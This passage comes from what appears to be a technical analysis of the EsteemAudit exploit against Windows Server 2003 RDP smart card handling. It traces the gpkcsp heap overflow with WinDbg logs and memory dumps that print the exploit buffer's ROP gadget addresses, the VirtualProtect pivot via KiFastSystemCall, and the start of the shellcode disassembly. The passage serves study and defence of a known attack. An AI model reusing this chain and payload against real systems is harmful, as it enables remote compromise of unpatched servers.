0x4943\n\n\n\nIn RDPDR module, we can see there is vtable call to recognize the packet and then handle the packet.\n\n\n\nFigure 21 RDPDR Module Handling the packet\n\nIf the server receives a packet marked as RDPDR_HEADER, RecognizePacket with the appropriate class is called.\n\n\n\nFigure 22 RecognizePacket called for RDPDR_HEADER\n\nThe buffer overflow and exploit packets sent by EsteemAudit have the 0x49434472 flag set. 0x4472 is used for the Device redirector core component and 0x4943 is used for Device I\/O response.\n\n\n\n\n\nFigure 23 Packet Type Flags from [MS-RDPESP]\n\nAfter recognizing the packet type, rdpdr!DrSession::ReadCompletion calls HandlePacket to parse the packet. We can see OnDeviceControlCompletion will deal with the header.\n\n\n\nFigure 24 Continued Parsing of the RDP Packet\n\nAfter handling the packet, we can see rdpdr!DrDevice::CompleteRxContext be notified via I\/O that we have processed the packet and we can exchange the context. Other modules are also notified and continue to process the left part of the packet, here is pbExtraBytes buffer.\n\n\n\nFigure 25 CompleteRxContext Notified of the Processed Packet\nUser Land Layer\nIn user land, winlogon.exe calls the smart card modules, like gpkcsp, scredir, and winscard to communicate with the client.\n\nFirst, we can investigate the stack trace below. It is a stack trace of copying the pbExtraBytes sent by the client from the kernel to the user land. We see the data sent by client flow into the user land on the server.\n\n\n\n0:003&gt; k\n\nChildEBP RetAddr\n\n00fce058 5cd45619 scredir!_CopyReturnToCallerBuffer\n\n00fce104 723642b0 scredir!SCardTransmit+0x194\n\n00fce180 08005c32 WinSCard!SCardTransmit+0x76\n\n00fce1b0 0800921d gpkcsp!DoSCardTransmit+0x3d\n\n00fce41c 0800e2dd gpkcsp!WriteTimestamps+0x679\n\n00fcf39c 08004acb gpkcsp!MyCPAcquireContext+0x817\n\n00fcf708 77f50909 gpkcsp!CPAcquireContext+0x26e\n\n00fcf7cc 77f50a5f ADVAPI32!CryptAcquireContextA+0x55f\n\n00fcf834 0103fd78 ADVAPI32!CryptAcquireContextW+0xa4\n\n00fcf864 0104086c winlogon!CSCLogonInit::CryptCtx+0x75\n\n00fcf874 010408c1 winlogon!CSCLogonInit::RelinquishCryptCtx+0x10\n\n00fcf898 0103a8f5 winlogon!ScHelperGetCertFromLogonInfo+0x22\n\n00fcf8bc 77c50193 winlogon!s_RPC_ScHelperGetCertFromLogonInfo+0x3f\n\n00fcf8e0 77cb33e1 RPCRT4!Invoke+0x30\n\n00fcfce0 77cb35c4 RPCRT4!NdrStubCall2+0x299\n\n00fcfcfc 77c4ff7a RPCRT4!NdrServerCall2+0x19\n\n00fcfd30 77c7e732 RPCRT4!DispatchToStubInCNoAvrf+0x38\n\n00fcfd48 77c5042d RPCRT4!DispatchToStubInCAvrf+0x14\n\n00fcfd9c 77c50353 RPCRT4!RPC_INTERFACE::DispatchToStubWorker+0x11f\n\n00fcfdc0 77c511dc RPCRT4!RPC_INTERFACE::DispatchToStub+0xa3\n\n00fcfdfc 77c512f0 RPCRT4!LRPC_SCALL::DealWithRequestMessage+0x42c\n\n00fcfe20 77c58678 RPCRT4!LRPC_ADDRESS::DealWithLRPCRequest+0x127\n\n00fcff84 77c58792 RPCRT4!LRPC_ADDRESS::ReceiveLotsaCalls+0x430\n\n00fcff8c 77c5872d RPCRT4!RecvLotsaCallsWrapper+0xd\n\n00fcffac 77c4b110 RPCRT4!BaseCachedThreadRoutine+0x9d\n\n00fcffb8 7c824829 RPCRT4!ThreadStartRoutine+0x1b\n\nWARNING: Stack unwind information not available. Following frames may be wrong.\n\n00fcffec 00000000 kernel32!GetModuleHandleA+0xdf\n\n\n\nThe most important function in user land on the server is gpkcsp!MyCPAcquireContext. It is responsible for sending, receiving and processing smart card packets, and it corresponds to the RecvProcessSendPackets function of EsteemAudit.\n\nBefore we start introduce this function, let\u2019s look at scredir!SCardTransmit. This function is called by gpkcsp!DoSCardTransmit and it is a basic unit for sending and receiving the smart card information.\n\n\n\nFigure 26 scredir!SCardTransmit Function\n\nWe that the 1st argument to _SendSCardIOCTL, 0x900d0, represents SCARD_IOCTL_TRANSMIT, and the data structure of the send and receive buffer fallows _Transmit_Call and _Transmit_Return structure described earlier. After getting the data from the kernel, Transmit_Return_Decode will decode and process the data. Pay attention to scredir!_CopyReturnToCallerBuffer function, it will copy the data sent by client to a global variable 0x080190d8 in data section. This means that the data in buffer overflow packet and in exploit packet will be copied to the address 0x080190d8. That\u2019s why an absolute address 0x080190dc is hardcoded in buffer overflow packet.\n\n\n\n\n\n&nbsp;\n\nFigure 27 Data from the Overflow and Exploit Packets are copied to 0x080190d8.\n\nNow we can introduce the gpkcsp!MyCPAcquireContext function and the whole exploit process. The details for SCardEstablishContext and ConnectToCard are not shown here, but we will introduce what happened when the data in buffer overflow packet arrived.\n\n\n\nFigure 28 gpkcsp!MyCPAcquireContext Function\n\nThere is global variable named ProvCont which stores a 0x24a8 sized heap address.\n\n\n\n0:003&gt; dc gpkcsp!ProvCont (08176dd8)\n\n08176dd8\u00a0 02cdcb58\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 X...\n\n&nbsp;\n\n0:003&gt; !heap -p -a 0x2cdcb58\n\naddress 02cdcb58 found in\n\n_DPH_HEAP_ROOT @ 3a1000\n\nin busy allocation (\u00a0 DPH_HEAP_BLOCK:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 UserAddr\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 UserSize -\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 VirtAddr\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 VirtSize)\n\n3a3c80:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 2cdcb58\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 24a8 -\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 2cdc000\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 4000\n\n7c96d97a ntdll!RtlAllocateHeap+0x00000e9f\n\n77b8d08c msvcrt!malloc+0x0000006c\n\n08012599 gpkcsp!GMEM_Alloc+0x0000000e\n\n0800a937 gpkcsp!DllMain+0x00000090\n\n080120fc gpkcsp!_DllMainCRTStartup+0x00000052\n\n7c94a352 ntdll!LdrpCallInitRoutine+0x00000014\n\n7c963465 ntdll!LdrpRunInitializeRoutines+0x00000367\n\n7c964311 ntdll!LdrpLoadDll+0x000003cd\n\n7c964065 ntdll!LdrLoadDll+0x00000198\n\n7c801bf3 kernel32!LoadLibraryExW+0x000001b2\n\n7c801dbd kernel32!LoadLibraryExA+0x0000001f\n\n7c801df3 kernel32!LoadLibraryA+0x000000b5\n\n77f42fef ADVAPI32!CryptAcquireContextA+0x0000045c\n\n77f50a5f ADVAPI32!CryptAcquireContextW+0x000000a4\n\n0103fd78 winlogon!CSCLogonInit::CryptCtx+0x00000075\n\n0104086c winlogon!CSCLogonInit::RelinquishCryptCtx+0x00000010\n\n010408c1 winlogon!ScHelperGetCertFromLogonInfo+0x00000022\n\n0103a8f5 winlogon!s_RPC_ScHelperGetCertFromLogonInfo+0x0000003f\n\n77c50193 RPCRT4!Invoke+0x00000030\n\n77cb33e1 RPCRT4!NdrStubCall2+0x00000299\n\n77cb35c4 RPCRT4!NdrServerCall2+0x00000019\n\n77c4ff7a RPCRT4!DispatchToStubInCNoAvrf+0x00000038\n\n77c7e732 RPCRT4!DispatchToStubInCAvrf+0x00000014\n\n77c5042d RPCRT4!RPC_INTERFACE::DispatchToStubWorker+0x0000011f\n\n77c50353 RPCRT4!RPC_INTERFACE::DispatchToStub+0x000000a3\n\n77c511dc RPCRT4!LRPC_SCALL::DealWithRequestMessage+0x0000042c\n\n77c512f0 RPCRT4!LRPC_ADDRESS::DealWithLRPCRequest+0x00000127\n\n77c58678 RPCRT4!LRPC_ADDRESS::ReceiveLotsaCalls+0x00000430\n\n77c58792 RPCRT4!RecvLotsaCallsWrapper+0x0000000d\n\n77c5872d RPCRT4!BaseCachedThreadRoutine+0x0000009d\n\n77c4b110 RPCRT4!ThreadStartRoutine+0x0000001b\n\n7c824829 kernel32!BaseThreadStart+0x00000034\n\n&nbsp;\n\n\n\nFigure 29 below graphically shows the data structure of gpkcsp!ProvCont.\n\n\n\nFigure 30 Graphical Depiction of the gpkcsp!ProvCont data structure.\n\nAfter calling DoSCardTransmit to deal with buffer overflow packet and store the data in 0x080190d8, MyCPAcquireContext initialize the KeyData memory (0x80) and copies the data at 0x080190dd with the size in the data sent by client (0xb2-7) to the KeyData memory.\n\n\n\nFigure 31 MyCPAcquireContext Initializes data structure and copies data, causing the overflow\n\nFigure 32 below shows how memory is overwritten causing the heap overflow.\n\n\n\nFigure 32 Graphical Depiction of the Heap Overflow\n\nThe debug log shows where KeyObject object overflows.\n\n\n\n0:003&gt; dc 02cdcb58+a0+b8-20\n\n02cdcc90\u00a0 b7314210 544f2b0f 34059cf0 ead224e5\u00a0 .B1..+OT...4.$..\n\n02cdcca0\u00a0 22ef2496 b2dcb268 9c36556f 159e7181\u00a0 .$.\"h...oU6..q..\n\n02cdccb0\u00a0 080190dc 00009000 70e2a252 b67b7cc7\u00a0 ........R..p.|{.\n\n02cdccc0\u00a0 62937b2c afe0bbbd 93606931 dcdba152\u00a0 ,{.b....1i`.R...\n\n02cdccd0\u00a0 00cd84d1 00000000 00000000 00000000\u00a0 ................\n\n02cdcce0\u00a0 00000000 00000000 00000000 00000000\u00a0 ................\n\n02cdccf0\u00a0 00000000 00000000 00000000 00000000\u00a0 ................\n\n02cdcd00\u00a0 00000000 00000000 00000000 00000000\u00a0 ................\n\n\n\nAfter KeyObject overflows, we can see how gpkcsp!MyCPAcquireContext deals with the next packets and how the EIP was controlled.\n\n\n\nFigure 33 gpkcsp!MyCPAcquireContext handles the subsequent packets\n\nWe note that the unsymbolized function sub_8009094 calls DoSCardTransmit and copies expbuffer to 0x080x90d8, which is an always fix address to store any data sent by client without ASLR (Address Space Layout Randomization) on Windows Server 2003.\n\n\n\n0:003&gt; dc 080190d8 L1c0\/4\n\n080190d8\u00a0 d26ccf61 08011e7a 0801118e 08005e85\u00a0 a.l.z........^..\n\n080190e8\u00a0 0800bedd 11111111 9d273fbe e636c0ea\u00a0 .........?'...6.\n\n080190f8\u00a0 00000000 b02838fd 08011fef 08019078\u00a0 .....8(.....x...\n\n08019108\u00a0 3005123c 22222222 00000000 f7a1d915\u00a0 &lt;..0\"\"\"\"........\n\n08019118\u00a0 00004000 080128cc 0000008f 7ffe0300\u00a0 .@...(..........\n\n08019128\u00a0 08015074 08019148 08019118 ffffffff\u00a0 tP..H...........\n\n08019138\u00a0 08019130 08019118 00000040 08019130\u00a0 0.......@...0...\n\n08019148\u00a0 8b6404b0 06002d00 c4890000 00e8c689\u00a0 ..d..-..........\n\n08019158\u00a0 90000000 d5858b5d 89000000 858b0446\u00a0 ....].......F...\n\n08019168\u00a0 000000d9 310c4689 104689c0 8b144689\u00a0 .....F.1..F..F..\n\n08019178\u00a0 0000dd85 8b008b00 0000bc80 18468900\u00a0 ..............F.\n\n08019188\u00a0 00e1858b 008b0000 8b1c4689 0000e585\u00a0 .........F......\n\n08019198\u00a0 89008b00 468b2046 2846890c 4689c031\u00a0 ....F .F..F(1..F\n\n080191a8\u00a0 00b5e82c c0850000 468b6675 0846892c\u00a0 ,.......uf.F,.F.\n\n080191b8\u00a0 2b0c468b 89501046 468b50e0 10460308\u00a0 .F.+F.P..P.F..F.\n\n080191c8\u00a0 50c03150 ff1476ff 76ff0476 1876ff20\u00a0 P1.P.v..v..v .v.\n\n080191d8\u00a0 591c56ff 8b144689 c8011046 8b104689\u00a0 .V.Y.F..F....F..\n\n080191e8\u00a0 46890846 10468b24 00d9853b c07c0000\u00a0 F..F$.F.;.....|.\n\n080191f8\u00a0 4689c031 244e8b10 0189c889 0471ff51\u00a0 1..F..N$....Q.q.\n\n08019208\u00a0 c083c889 d0ff5014 03ebc031 5048c031\u00a0 .....P..1...1.HP\n\n08019218\u00a0 852c468b 8b0e74c0 58e81058 85000000\u00a0 .F,..t..X..X....\n\n08019228\u00a0 ff0274db c3e431d3 080192d8 00006346\u00a0 .t...1......Fc..\n\n08019238\u00a0 08176dd8 0800119c 080011cc 000012b8\u00a0 .m..............\n\n08019248\u00a0 24548d00 c22ecd04 18c20018 0057b800\u00a0 ..T$..........W.\n\n08019258\u00a0 548d0000 2ecd0424 6a0010c2 30006840\u00a0 ...T$......j@h.0\n\n08019268\u00a0 468d0000 c0315028 2c468d50 48c03150\u00a0 ...F(P1.P.F,P1.H\n\n08019278\u00a0 ffc6e850 68c3ffff 00008000 5028468d\u00a0 P......h.....F(P\n\n08019288\u00a0 502c468d 5048c031 ffffc0e8 6578c3ff\u00a0 .F,P1.HP......xe\n\n&nbsp;\n\n\n\nAfter the exploit buffer is ready, gpkcsp!MyCPAcquireContext processes the ReleaseProvider path.\n\n\n\nFigure 34 gpkcsp!MyCPAcquireContext processes the ReleaseProvider path\n\nThis will trigger the C++ class vtable call KeyObject-&gt;release in the CryptDestroyKey function.\n\n\n\nFigure 35 Object is released in the CryptDestroyKey function\n\nThe log below show the process from controlling EIP to shellcode execution. The exploit uses the SharedUserData technique to call KiFastSystemCall to execute VirtualProtect and make the memory 0x080180d8 writable and executable, and to execute the shellcode at address 0x08019148. At this point the exploit has completed the first stage.\n\n\n\n&nbsp;\n\n0:011&gt; g 08007c2b\n\neax=080190dc ebx=77f3f5b0 ecx=02cdaff8 edx=00000000 esi=000000b8 edi=00000000\n\neip=08007c2b esp=02dfe40c ebp=02dfe420 iopl=0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 nv up ei pl nz na po nc\n\ncs=001b\u00a0 ss=0023\u00a0 ds=0023\u00a0 es=0023\u00a0 fs=003b\u00a0 gs=0000\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 efl=00000202\n\ngpkcsp!ReleaseProvider+0xef:\n\n08007c2b ffd3\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 call\u00a0\u00a0\u00a0 ebx {ADVAPI32!CryptDestroyKey (77f3f5b0)}\n\n&nbsp;\n\n0:011&gt;\n\neax=00000001 ebx=00000001 ecx=77f50c75 edx=00000000 esi=080190dc edi=08019078\n\neip=77f3f615 esp=02dfe3c0 ebp=02dfe404 iopl=0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 nv up ei pl nz na po nc\n\ncs=001b\u00a0 ss=0023\u00a0 ds=0023\u00a0 es=0023\u00a0 fs=003b\u00a0 gs=0000\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 efl=00000202\n\nADVAPI32!CryptDestroyKey+0x6e:\n\n77f3f615 ff5608\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 call\u00a0\u00a0\u00a0 dword ptr [esi+8]\u00a0\u00a0\u00a0 ds:0023:080190e4=08005e85\n\n0:011&gt; t\n\neax=00000001 ebx=00000001 ecx=77f50c75 edx=00000000 esi=080190dc edi=08019078\n\neip=08005e85 esp=02dfe3bc ebp=02dfe404 iopl=0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 nv up ei pl nz na po nc\n\ncs=001b\u00a0 ss=0023\u00a0 ds=0023\u00a0 es=0023\u00a0 fs=003b\u00a0 gs=0000\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 efl=00000202\n\ngpkcsp!GetAppWindow+0x1c:\n\n08005e85 8bc6\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 mov\u00a0\u00a0\u00a0\u00a0 eax,esi\n\n0:011&gt;\n\neax=080190dc ebx=00000001 ecx=77f50c75 edx=00000000 esi=080190dc edi=08019078\n\neip=08005e87 esp=02dfe3bc ebp=02dfe404 iopl=0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 nv up ei pl nz na po nc\n\ncs=001b\u00a0 ss=0023\u00a0 ds=0023 \u00a0es=0023\u00a0 fs=003b\u00a0 gs=0000\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 efl=00000202\n\ngpkcsp!GetAppWindow+0x1e:\n\n08005e87 5e\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 pop\u00a0\u00a0\u00a0\u00a0 esi\n\n0:011&gt;\n\neax=080190dc ebx=00000001 ecx=77f50c75 edx=00000000 esi=77f3f618 edi=08019078\n\neip=08005e88 esp=02dfe3c0 ebp=02dfe404 iopl=0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 nv up ei pl nz na po nc\n\ncs=001b\u00a0 ss=0023\u00a0 ds=0023\u00a0 es=0023\u00a0 fs=003b\u00a0 gs=0000\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 efl=00000202\n\ngpkcsp!GetAppWindow+0x1f:\n\n08005e88 c3\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 ret\n\n0:011&gt; t\n\neax=080190dc ebx=00000001 ecx=77f50c75 edx=00000000 esi=77f3f618 edi=08019078\n\neip=0800bedd esp=02dfe3c4 ebp=02dfe404 iopl=0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 nv up ei pl nz na po nc\n\ncs=001b\u00a0 ss=0023\u00a0 ds=0023\u00a0 es=0023\u00a0 fs=003b\u00a0 gs=0000\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 efl=00000202\n\ngpkcsp!funcCheck+0x129:\n\n0800bedd 94\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 xchg\u00a0\u00a0\u00a0 eax,esp\n\n0:011&gt; t\n\neax=02dfe3c4 ebx=00000001 ecx=77f50c75 edx=00000000 esi=77f3f618 edi=08019078\n\neip=0800bede esp=080190dc ebp=02dfe404 iopl=0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 nv up ei pl nz na po nc\n\ncs=001b\u00a0 ss=0023\u00a0 ds=0023\u00a0 es=0023\u00a0 fs=003b\u00a0 gs=0000\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 efl=00000202\n\ngpkcsp!funcCheck+0x12a:\n\n0800bede c3\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 ret\n\n0:011&gt; t\n\neax=02dfe3c4 ebx=00000001 ecx=77f50c75 edx=00000000 esi=77f3f618 edi=08019078\n\neip=08011e7a esp=080190e0 ebp=02dfe404 iopl=0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 nv up ei pl nz na po nc\n\ncs=001b\u00a0 ss=0023\u00a0 ds=0023\u00a0 es=0023\u00a0 fs=003b\u00a0 gs=0000\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 efl=00000202\n\ngpkcsp!MyCPSignHash+0x3ac:\n\n08011e7a c21c00\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 ret\u00a0\u00a0\u00a0\u00a0 1Ch\n\n0:011&gt; t\n\neax=02dfe3c4 ebx=00000001 ecx=77f50c75 edx=00000000 esi=77f3f618 edi=08019078\n\neip=0801118e esp=08019100 ebp=02dfe404 iopl=0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 nv up ei pl nz na po nc\n\ncs=001b\u00a0 ss=0023\u00a0 ds=0023\u00a0 es=0023\u00a0 fs=003b\u00a0 gs=0000\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 efl=00000202\n\ngpkcsp!MyCPImportKey+0xac3:\n\n0801118e c21800\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 ret\u00a0\u00a0\u00a0\u00a0 18h\n\n0:011&gt; t\n\neax=02dfe3c4 ebx=00000001 ecx=77f50c75 edx=00000000 esi=77f3f618 edi=08019078\n\neip=08011fef esp=0801911c ebp=02dfe404 iopl=0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 nv up ei pl nz na po nc\n\ncs=001b\u00a0 ss=0023\u00a0 ds=0023\u00a0 es=0023\u00a0 fs=003b\u00a0 gs=0000\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 efl=00000202\n\ngpkcsp!__report_gsfailure+0xdf:\n\n08011fef c3\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 ret\n\n0:011&gt; t\n\neax=02dfe3c4 ebx=00000001 ecx=77f50c75 edx=00000000 esi=77f3f618 edi=08019078\n\neip=080128cc esp=08019120 ebp=02dfe404 iopl=0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 nv up ei pl nz na po nc\n\ncs=001b\u00a0 ss=0023\u00a0 ds=0023\u00a0 es=0023\u00a0 fs=003b\u00a0 gs=0000\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 efl=00000202\n\ngpkcsp!CC_Exit+0x4f:\n\n080128cc 58\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 pop\u00a0\u00a0\u00a0\u00a0 eax\n\n0:011&gt; t\n\neax=0000008f ebx=00000001 ecx=77f50c75 edx=00000000 esi=77f3f618 edi=08019078\n\neip=080128cd esp=08019124 ebp=02dfe404 iopl=0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 nv up ei pl nz na po nc\n\ncs=001b\u00a0 ss=0023\u00a0 ds=0023\u00a0 es=0023\u00a0 fs=003b\u00a0 gs=0000\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 efl=00000202\n\ngpkcsp!CC_Exit+0x50:\n\n080128cd 5b\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 pop\u00a0\u00a0\u00a0\u00a0 ebx\n\n0:011&gt; t\n\neax=0000008f ebx=7ffe0300 ecx=77f50c75 edx=00000000 esi=77f3f618 edi=08019078\n\neip=080128ce esp=08019128 ebp=02dfe404 iopl=0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 nv up ei pl nz na po nc\n\ncs=001b\u00a0 ss=0023\u00a0 ds=0023\u00a0 es=0023\u00a0 fs=003b\u00a0 gs=0000\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 efl=00000202\n\ngpkcsp!CC_Exit+0x51:\n\n080128ce c3\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ret\n\n0:011&gt; t\n\neax=0000008f ebx=7ffe0300 ecx=77f50c75 edx=00000000 esi=77f3f618 edi=08019078\n\neip=08015074 esp=0801912c ebp=02dfe404 iopl=0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 nv up ei pl nz na po nc\n\ncs=001b\u00a0 ss=0023\u00a0 ds=0023\u00a0 es=0023\u00a0 fs=003b\u00a0 gs=0000\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 efl=00000202\n\ngpkcsp!CC_Exit+0x27f7:\n\n08015074 ff23\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 jmp\u00a0\u00a0\u00a0\u00a0 dword ptr [ebx]\u00a0\u00a0\u00a0\u00a0\u00a0 ds:0023:7ffe0300={ntdll!KiFastSystemCall (7c9585e8)}\n\n&nbsp;\n\nShellcode start:\n\nNo prior disassembly possible\n\n08019148 b004\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 mov\u00a0\u00a0\u00a0\u00a0 al,4\n\n0801914a 648b00\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 mov\u00a0\u00a0\u00a0\u00a0 eax,dword ptr fs:[eax]\n\n0801914d 2d00060000\u00a0\u00a0\u00a0\u00a0\u00a0 sub\u00a0\u00a0\u00a0\u00a0 eax,600h\n\n08019152 89c4\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 mov\u00a0\u00a0\u00a0\u00a0 esp,eax\n\n08019154 89c6\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 mov\u00a0\u00a0\u00a0\u00a0 esi,eax\n\n08019156 e800000000\u00a0\u00a0\u00a0\u00a0\u00a0 call\u00a0\u00a0\u00a0 gpkcsp!IsProgButtonClick+0x8f (0801915b)\n\n0801915b 90\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 nop\n\n0801915c 5d \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0pop\u00a0\u00a0\u00a0\u00a0 ebp\n\n0801915d 8b85d5000000\u00a0\u00a0\u00a0 mov\u00a0\u00a0\u00a0\u00a0 eax,dword ptr [ebp+0D5h]\n\n08019163 894604\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 mov\u00a0\u00a0\u00a0\u00a0 dword ptr [esi+4],eax\n\n08019166 8b85d9000000\u00a0\u00a0\u00a0 mov\u00a0\u00a0\u00a0\u00a0 eax,dword ptr [ebp+0D9h]\n\n0801916c 89460c\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 mov\u00a0\u00a0\u00a0\u00a0 dword ptr [esi+0Ch],eax\n\n0801916f 31c0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 xor\u00a0\u00a0\u00a0\u00a0 eax,eax\n\n08019171 894610\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 mov\u00a0\u00a0\u00a0\u00a0 dword ptr [esi+10h],eax\n\n08019174 894614\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 mov\u00a0\u00a0\u00a0\u00a0 dword ptr [esi+14h],eax\n\n08019177 8b85dd000000\u00a0\u00a0\u00a0 mov\u00a0\u00a0\u00a0\u00a0 eax,dword ptr [ebp+0DDh]\n\n0801917d 8b00\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 mov\u00a0\u00a0\u00a0\u00a0 eax,dword ptr [eax]\n\n0801917f 8b80bc000000\u00a0\u00a0\u00a0 mov\u00a0\u00a0\u00a0\u00a0 eax,dword ptr [eax+0BCh]\n\n08019185 894618\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 mov\u00a0\u00a0\u00a0\u00a0 dword ptr [esi+18h],eax\n\n08019188 8b85e1000000\u00a0\u00a0\u00a0 mov\u00a0\u00a0\u00a0\u00a0 eax,dword ptr [ebp+0E1h]\n\n0801918e 8b00\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 mov\u00a0\u00a0\u00a0\u00a0 eax,dword ptr [eax]\n\n08019190 89461c\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 \u00a0\u00a0mov\u00a0\u00a0\u00a0\u00a0 dword ptr [esi+1Ch],eax\n\n08019193 8b85e5000000\u00a0\u00a0\u00a0 mov\u00a0\u00a0\u00a0\u00a0 eax,dword ptr [ebp+0E5h]\n\n08019199 8b00\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 mov\u00a0\u00a0\u00a0\u00a0 eax,dword ptr [eax]\n\n0801919b 894620\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 mov\u00a0\u00a0\u00a0\u00a0 dword ptr [esi+20h],eax\n\n0801919e 8b460c\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 mov\u00a0\u00a0\u00a0\u00a0 eax,dword ptr [esi+0Ch]\n\n080191a1 894628\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 mov\u00a0\u00a0\u00a0\u00a0 dword ptr 